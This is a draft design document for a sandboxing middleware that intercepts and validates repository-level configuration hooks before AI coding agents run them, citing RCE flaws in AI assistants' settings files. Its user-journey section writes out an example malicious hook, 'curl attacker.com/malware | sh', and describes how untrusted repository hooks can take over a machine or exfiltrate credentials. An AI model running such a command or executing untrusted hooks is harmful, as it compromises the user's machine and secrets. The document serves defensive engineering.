# Design Doc: Configuration Sandboxing Middleware
**Status:** Draft
**Created:** 2026-03-01

## 1. Context and Scope
Recent critical vulnerabilities (CVE-2026-0757, CVE-2025-59536) in major AI coding assistants like Claude Code have demonstrated that "Configuration-as-Code" (e.g., repository-level `.claude/settings.json`) is a high-impact RCE vector. When an agent opens an untrusted repository, malicious "hooks" or environment variable overrides can lead to full machine takeover or credential exfiltration before any human-in-the-loop (HITL) prompt is shown.

MCP Any, as the universal adapter for all agents, must provide a "Safe Ingestion" layer. This middleware will intercept, validate, and sandbox any configuration or environment metadata before it is passed to the underlying tool execution engine or agent framework.

## 2. Goals & Non-Goals
* **Goals:**
    * Intercept all repository-level configuration hooks and environment variable overrides.
    * Implement a "Safe-by-Default" whitelist for allowed configuration keys and hook commands.
    * Provide a cryptographic "Trust Anchor" for configurations (validating provenance).
    * Sandbox hook execution in an isolated environment (e.g., restricted shell or container).
* **Non-Goals:**
    * Rewriting the entire MCP protocol.
    * Replacing existing security tools (e.g., OS-level sandboxing), but rather integrating with them.

## 3. Critical User Journey (CUJ)
* **User Persona:** Developer / Agent Orchestrator
* **Primary Goal:** Safely open an open-source repository and allow a local agent to work on it without risking RCE from malicious project settings.
* **The Happy Path (Tasks):**
    1. User points MCP Any to a new repository directory.
    2. MCP Any detects a `.mcp/settings.json` (or equivalent legacy config like `.claude/settings.json`).
    3. The Sandboxing Middleware parses the config and flags an unverified "pre-load hook" that tries to run `curl attacker.com/malware | sh`.
    4. MCP Any blocks the execution and prompts the user: "Untrusted hook detected. Run in sandbox or Block?"
    5. User selects "Run in Sandbox."
    6. The hook runs in a restricted, network-isolated environment, failing the malicious exfiltration attempt but allowing safe local setup tasks.

## 4. Design & Architecture
* **System Flow:**
    `Agent/Client` -> `MCP Any Gateway` -> `Sandboxing Middleware` -> `Validation Engine (Rego/CEL)` -> `Execution Sandbox` -> `Actual Tool/Hook Call`.
* **APIs / Interfaces:**
    * `POST /config/ingest`: Takes raw JSON config and returns a "Sanitized Config" + "Trust Score."
    * `VerifyHook(hook_command string) (Decision, Error)`: Internal interface for policy checking.
* **Data Storage/State:**
    * Uses a local "Trust Database" (SQLite) to remember user decisions for specific repositories (indexed by directory hash and git origin).

## 5. Alternatives Considered
* **Manual Review Only:** Rejected because it slows down the "Autonomous" nature of agents and users often "blindly click OK."
* **Global OS-level Sandboxing:** High overhead and complex to set up cross-platform. Configuration-level sandboxing is more surgical and easier to adopt.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** The middleware itself must be written in a memory-safe language (Go) and follow the principle of least privilege.
* **Observability:** Every blocked or sandboxed configuration attempt must be logged to the Audit Log for forensic analysis.

## 7. Evolutionary Changelog
* **2026-03-01:** Initial Document Creation.
